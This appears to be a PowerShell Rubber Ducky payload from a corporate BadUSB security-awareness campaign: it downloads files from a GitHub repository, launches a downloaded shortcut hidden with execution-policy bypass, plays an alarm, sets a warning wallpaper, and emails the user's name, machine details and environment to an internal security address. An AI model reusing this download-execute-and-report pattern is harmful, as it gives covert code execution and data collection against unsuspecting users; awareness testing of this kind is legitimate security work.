$a = "C:\L1dl";
cd $a;
[console]::beep(2000,500);
wget https://raw.githubusercontent.com/balazsbanyasz/work/main/alarm.mp3 -o "alarm.mp3";
wget https://raw.githubusercontent.com/balazsbanyasz/work/main/PS.exe.lnk -o "PS.exe.lnk";
&"$a\PS.exe.lnk" -WindowStyle hidden -exec bypass -c {$a = "C:\L1dl"; Add-Type -AssemblyName presentationCore;$mediaPLayer = New-Object system.windows.media.mediaplayer;$mediaPlayer.open("$a\alarm.mp3");$mediaPLayer.Volume = 0.9;$mediaPLayer.Play();Start-Sleep -Seconds 15;exit};
$rand = (Get-Random -Maximum 4 ) + 1
wget "https://raw.githubusercontent.com/balazsbanyasz/work/main/BadUSBAwareness$rand.png" -o "BadUSBAwareness$rand.png";

Function Set-WallPaper {
param (
    [parameter(Mandatory=$True)]
    [string]$Image,
    [parameter(Mandatory=$False)]
    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
    [string]$Style
)
 
$WallpaperStyle = Switch ($Style) {
  
    "Fill" {"10"}
    "Fit" {"6"}
    "Stretch" {"2"}
    "Tile" {"0"}
    "Center" {"0"}
    "Span" {"22"}
  
}
 
If($Style -eq "Tile") {
 
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
 
}
Else {
 
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
 
}
 
Add-Type -TypeDefinition @" 
using System; 
using System.Runtime.InteropServices;
  
public class Params
{ 
    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
    public static extern int SystemParametersInfo (Int32 uAction, 
                                                   Int32 uParam, 
                                                   String lpvParam, 
                                                   Int32 fuWinIni);
}
"@ 
  
    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02
  
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
  
    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
};

Set-WallPaper -Image "$a\BadUSBAwareness$rand.png" -Style Fit;

& ".\BadUSBAwareness$rand.png";

$name = whoami; $name = $name.substring(3); echo "#awarenessCampaign | BadUSBAwarenessV2 | HWid: duck" >> C:\L1dl\$name.txt; whoami >> C:\L1dl\$name.txt; Get-ChildItem Env: | ft key,Value; $env:COMPUTERNAME >> C:\L1dl\$name.txt; $env:CLIENTTYPE >> C:\L1dl\$name.txt; date >> C:\L1dl\$name.txt; $date = date; $email = ([ADSISEARCHER]"samaccountname=$name").FindOne().Properties.mail; Send-MailMessage -To "iso@lidl.hu" -Subject "$name rubberducky!" -Body "$name $date bedugta a rubber duckyt a gépébe" -SmtpServer '10.68.8.16'-From $email -Attachments "C:\L1dl\$name.txt" -encoding "unicode";
